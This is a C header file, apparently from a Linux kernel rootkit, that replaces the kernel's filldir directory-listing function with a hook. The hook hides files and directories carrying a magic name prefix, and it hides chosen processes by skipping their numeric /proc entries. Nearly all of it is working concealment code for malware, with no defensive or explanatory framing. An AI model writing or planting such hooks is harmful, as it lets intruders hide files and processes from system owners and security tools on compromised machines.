// https://github.com/torvalds/linux/blob/4a1d8ababde685a77fd4fd61e58f973cbdf29f8c/fs/readdir.c#L259
#ifndef FILLDIR_H
#define FILLDIR_H
#include "../config.h"

// Helper function to check if a string is numeric (PID)
static bool is_numeric_string(const char *str, int len) {
    int i;
    for (i = 0; i < len; i++) {
        if (str[i] < '0' || str[i] > '9') {
            return false;
        }
    }
    return true;
}

// Helper function to convert string to PID
static pid_t string_to_pid(const char *str, int len) {
    pid_t pid = 0;
    int i;
    for (i = 0; i < len; i++) {
        if (str[i] < '0' || str[i] > '9') {
            return -1;
        }
        pid = pid * 10 + (str[i] - '0');
    }
    return pid;
}

static asmlinkage int(*original_filldir)(struct dir_context *ctx, const char *name, int namlen, loff_t offset, u64 ino, unsigned int d_type);
static asmlinkage bool filldir_hook(struct dir_context *ctx, const char *name, int namlen, loff_t offset, u64 ino, unsigned int d_type) {
    // Hide files/directories with magic prefix
    if (!strncmp(name, MAGIC_PREFIX, sizeof(MAGIC_PREFIX)-1)) {
        return 0;
    }

    // Check if we're in /proc directory and hiding processes
    if (d_type == DT_DIR && is_numeric_string(name, namlen)) {
        pid_t pid = string_to_pid(name, namlen);
        if (pid > 0 && is_pid_hidden_by_name(pid)) {
            return 0; // Hide this process directory
        }
    }

    return original_filldir(ctx, name, namlen, offset, ino, d_type);
}

#endif // !FILLDIR_H
